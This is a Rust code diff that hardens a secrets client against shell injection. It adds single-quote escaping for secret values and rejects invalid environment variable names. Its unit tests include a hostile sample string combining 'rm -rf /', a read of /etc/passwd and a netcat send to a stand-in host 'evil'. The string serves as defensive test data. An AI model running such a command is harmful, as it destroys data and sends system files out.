@@ -129,6 +129,41 @@ impl CreddClient {
             .await
     }
 
+    /// Resolve secret placeholders with shell-safe escaping.
+    ///
+    /// Each substituted value is wrapped in single quotes with internal
+    /// single quotes escaped as `'\''`, preventing shell metacharacter
+    /// injection when the resolved text is passed to `/bin/sh -c`.
+    pub async fn resolve_text_shell_safe(
+        &self,
+        db: &Database,
+        user_id: i64,
+        agent: &str,
+        text: &str,
+    ) -> Result<String> {
+        if !has_secret_patterns(text) {
+            return Ok(text.to_string());
+        }
+
+        resolve_patterns(text, |pattern| async move {
+            let raw = self
+                .fetch_secret_value(
+                    db,
+                    user_id,
+                    agent,
+                    FetchSecretRequest {
+                        service: &pattern.service,
+                        key: &pattern.key,
+                        mode: SecretAccessMode::Resolved,
+                        use_cache: true,
+                    },
+                )
+                .await?;
+            Ok(shell_escape_value(&raw))
+        })
+        .await
+    }
+
     pub async fn resolve_text_with_options(
         &self,
         db: &Database,
@@ -163,7 +198,7 @@ impl CreddClient {
                             "raw secret placeholders are only allowed on admin-gated flows".into(),
                         ));
                     }
-                    self.get_raw(db, agent, &pattern.service, &pattern.key)
+                    self.get_raw(db, user_id, agent, &pattern.service, &pattern.key)
                         .await
                 }
             }
@@ -253,6 +288,7 @@ impl CreddClient {
     pub async fn get_raw(
         &self,
         _db: &Database,
+        _user_id: i64,
         _agent: &str,
         _service: &str,
         _key: &str,
@@ -425,6 +461,18 @@ impl CreddClient {
 // (ported from eidolon-daemon/src/secrets.rs)
 // ---------------------------------------------------------------------------
 
+/// True when `name` is a valid POSIX shell variable name: a leading letter or
+/// underscore followed by letters, digits, or underscores. Used to reject
+/// secret keys that could inject shell syntax into an export block.
+fn is_valid_env_var_name(name: &str) -> bool {
+    let mut chars = name.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
 /// For an Environment-type secret, build a shell export block from all
 /// key-value pairs in the secret value object.
 ///
@@ -451,17 +499,28 @@ pub fn extract_env_export_block(secret: &Value) -> crate::Result<String> {
         })?;
 
     // Filter out the serde tag field "type" from the export block.
-    let exports: Vec<String> = val
-        .iter()
-        .filter(|(k, _)| k.as_str() != "type")
-        .filter_map(|(k, v)| {
-            v.as_str().map(|val_str| {
-                // Shell-escape the value using single-quote wrapping.
-                let escaped = val_str.replace('\'', "'\\''");
-                format!("export {}='{}'", k, escaped)
-            })
-        })
-        .collect();
+    let mut exports: Vec<String> = Vec::new();
+    for (k, v) in val.iter() {
+        if k.as_str() == "type" {
+            continue;
+        }
+        // SECURITY (L10): the variable name is interpolated unquoted into the
+        // shell export block, so a name containing whitespace, ';', a newline,
+        // or '=' could inject extra commands or variables. Refuse any name
+        // that is not a POSIX shell identifier. Values stay safe via the
+        // single-quote wrapping below (every metacharacter, including
+        // newlines, is literal inside single quotes; only embedded quotes
+        // need escaping).
+        if !is_valid_env_var_name(k) {
+            return Err(crate::EngError::InvalidInput(format!(
+                "invalid environment variable name in secret: {k:?}"
+            )));
+        }
+        if let Some(val_str) = v.as_str() {
+            let escaped = val_str.replace('\'', "'\\''");
+            exports.push(format!("export {}='{}'", k, escaped));
+        }
+    }
 
     if exports.is_empty() {
         return Err(crate::EngError::InvalidInput(
@@ -474,16 +533,6 @@ pub fn extract_env_export_block(secret: &Value) -> crate::Result<String> {
 
 /// Trust evaluation seam. Currently returns 0 (deny-by-default).
 /// Phase 2 will track session age, tool call count, and gate block count
-/// to produce a decaying score.
-#[allow(
-    dead_code,
-    unused_variables,
-    reason = "Phase 2 seam -- will track session trust decay"
-)]
-pub fn evaluate_trust(session_id: &str) -> u8 {
-    0
-}
-
 /// Build the reqwest client used for every credd call.
 ///
 /// SECURITY / ROBUSTNESS: every HTTP call to credd must time out. Without
@@ -571,5 +620,57 @@ fn extract_secret_value(value: &Value) -> Result<String> {
             ))
         }
         other => serde_json::to_string(other).map_err(EngError::Serialization),
+    }
+}
+
+/// Shell-escape a value for safe interpolation into `/bin/sh -c` commands.
+///
+/// Wraps the value in single quotes. Internal single quotes are escaped as
+/// `'\''` (end quote, escaped literal quote, start quote). This prevents
+/// shell metacharacters in secret values from being interpreted.
+pub fn shell_escape_value(val: &str) -> String {
+    let mut out = String::with_capacity(val.len() + 2);
+    out.push('\'');
+    for c in val.chars() {
+        if c == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(c);
+        }
+    }
+    out.push('\'');
+    out
+}
+
+#[cfg(test)]
+mod shell_escape_tests {
+    use super::shell_escape_value;
+
+    #[test]
+    fn plain_value_wrapped_in_quotes() {
+        assert_eq!(shell_escape_value("hello"), "'hello'");
+    }
+
+    #[test]
+    fn metacharacters_are_inert() {
+        let val = "$(rm -rf /); echo pwned & cat /etc/passwd | nc evil 1234";
+        let escaped = shell_escape_value(val);
+        assert_eq!(
+            escaped,
+            format!("'{}'", val),
+            "value without internal single-quotes should be wrapped verbatim"
+        );
+    }
+
+    #[test]
+    fn internal_single_quotes_escaped() {
+        let val = "it's a secret";
+        let escaped = shell_escape_value(val);
+        assert_eq!(escaped, "'it'\\''s a secret'");
+    }
+
+    #[test]
+    fn empty_value() {
+        assert_eq!(shell_escape_value(""), "''");
     }
 }
